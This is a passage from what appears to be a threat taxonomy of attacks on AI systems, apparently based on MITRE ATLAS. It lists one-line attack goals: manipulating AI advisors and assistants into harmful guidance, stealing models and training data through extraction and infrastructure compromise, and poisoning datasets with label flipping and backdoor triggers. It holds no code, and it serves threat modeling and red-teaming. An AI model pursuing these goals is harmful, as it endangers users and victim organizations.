          Manipulate AI-powered personal financial advisors to give harmful investment advice
          Manipulate AI-powered legal assistance tools to provide harmful legal advice
          Exploit AI navigation systems to misdirect users into dangerous areas
          Generate false legal documents or evidence targeting specific individuals
          Manipulate AI-powered mental health support systems to provide harmful guidance
          Use AI to generate personalized addiction-triggering content based on user vulnerabilities
          Exploit AI-powered smart home systems to harass or intimidate residents
          Manipulate AI personal assistants to provide dangerous recommendations
          Generate false location data to compromise user safety or alibis
          Use AI to create targeted content exploiting personal trauma or vulnerabilities
          Manipulate AI-powered accessibility tools to disable or mislead disabled users
        AI Intellectual Property Theft: Adversaries may exfiltrate AI artifacts to steal intellectual property and cause economic harm to the victim organization.  Proprietary training data is costly to collect and annotate and may be a target for [Exfiltration](/tactics/AML.TA0010) and theft.  AIaaS providers charge for use of their API. An adversary who has stolen a model via [Exfiltration](/tactics/AML.TA0010) or via [Extract AI Model](/techniques/AML.T0024.002) now has unlimited use of that service without paying the owner of the intellectual property.
          Use model extraction attacks through repeated API queries to reconstruct a similar model
          Intercept and capture training data through compromised data pipelines
          Reverse engineer model architecture through memory dumps of running AI services
          Deploy automated scripts to harvest proprietary datasets through legitimate API endpoints
          Exploit vulnerabilities in model serving infrastructure to access model files directly
          Use social engineering to obtain credentials for AI service administrative access
          Implement payment system bypass through API key manipulation
          Monitor network traffic to capture model parameters during training/inference
          Extract embedded models from edge devices or mobile applications
          Scrape proprietary datasets using distributed botnet networks
          Access model checkpoints in cloud storage through misconfigured permissions
          Compromise CI/CD pipelines to intercept model updates during deployment
          Plant insider personnel to collect training data and model artifacts
          Exploit model serialization formats to extract architecture details
          Leverage third-party dependencies to access model parameters
          Clone git repositories containing model code and weights
          Capture model gradients during distributed training
          Exploit backup systems storing model snapshots
          Intercept model transfer learning datasets
          Extract embedded models from containerized deployments
          Extract model parameters through side-channel attacks on GPU memory
          Compromise model optimization tools to exfiltrate architecture details
          Exploit model serving frameworks' logging functionality
          Intercept model quantization processes to capture parameters
          Extract embedded models from IDE caches and temporary files
          Compromise model registry services to access stored artifacts
          Exploit model versioning systems during collaborative development
          Capture model architecture through debugging tool traces
          Extract model details from automated testing environments
          Intercept model parameters during hardware acceleration optimization
          Exploit API rate limiting mechanisms to bypass usage tracking
          Intercept preprocessed data between data cleaning services and training pipeline
          Extract model knowledge through federated learning contribution manipulation
          Compromise transfer learning adaptation layers during fine-tuning
          Exploit model serving proxy caches to access model parameters
          Extract embedded models from automated model conversion tools
          Capture proprietary data augmentation pipelines
          Exploit model architecture search automation tools
          Intercept hyperparameter optimization experiment results
          Extract model knowledge through ensemble model interfaces
      Erode Dataset Integrity: Adversaries may poison or manipulate portions of a dataset to reduce its usefulness, reduce trust, and cause users to waste resources correcting errors.
        ~Data Poisoning Attack: Adversaries deliberately introduce malicious samples into training data to corrupt model behavior
        ~Label Flipping: Adversaries systematically modify class labels in training data to degrade model performance
        ~Backdoor Injection: Adversaries insert specific triggers into training data that cause targeted misclassification
        ~Feature Manipulation: Adversaries alter specific features or attributes in the dataset to introduce bias
        ~Noise Injection: Adversaries add random or structured noise to corrupt data points
        ~Sample Selection Bias: Adversaries manipulate dataset composition to create unrepresentative samples
        ~Temporal Poisoning: Adversaries modify time-series data to create false patterns or trends
        ~Data Corruption: Adversaries deliberately corrupt or damage data files to make them unusable
        ~Synthetic Data Injection: Adversaries insert artificially generated samples to pollute genuine data
        ~Data Structure Manipulation: Adversaries modify relationships between data points to disrupt learning patterns
        ~Metadata Manipulation: Adversaries alter or corrupt metadata to disrupt data interpretation and processing
        ~Data Format Corruption: Adversaries modify data formatting to cause parsing errors while maintaining apparent validity
        ~Cross-Dataset Contamination: Adversaries mix incompatible or irrelevant data from different sources
        ~Gradual Degradation: Adversaries slowly introduce small errors over time to avoid detection
        ~Data Provenance Attack: Adversaries manipulate data lineage information to hide modifications
        ~Schema Poisoning: Adversaries modify data schema or structure definitions to cause misinterpretation
        ~Validation Rule Manipulation: Adversaries alter data validation rules to allow corrupt data
        ~Semantic Manipulation: Adversaries preserve syntactic correctness while altering semantic meaning
        ~Distribution Shift Attack: Adversaries manipulate data distribution to create model bias while maintaining individual data point validity
        ~Cascade Corruption: Adversaries exploit data dependencies to propagate errors through related datasets
        ~Version Control Poisoning: Adversaries manipulate dataset version history to hide modifications or inject corrupted backups
        ~Synchronization Attack: Adversaries exploit data synchronization mechanisms to spread corrupted data across replicas
        ~Context Manipulation: Adversaries alter contextual relationships between data points while preserving individual values
        ~Data Transformation Poisoning: Adversaries manipulate data during preprocessing or transformation stages
        ~Reference Data Attack: Adversaries corrupt reference or lookup data used for data validation or enrichment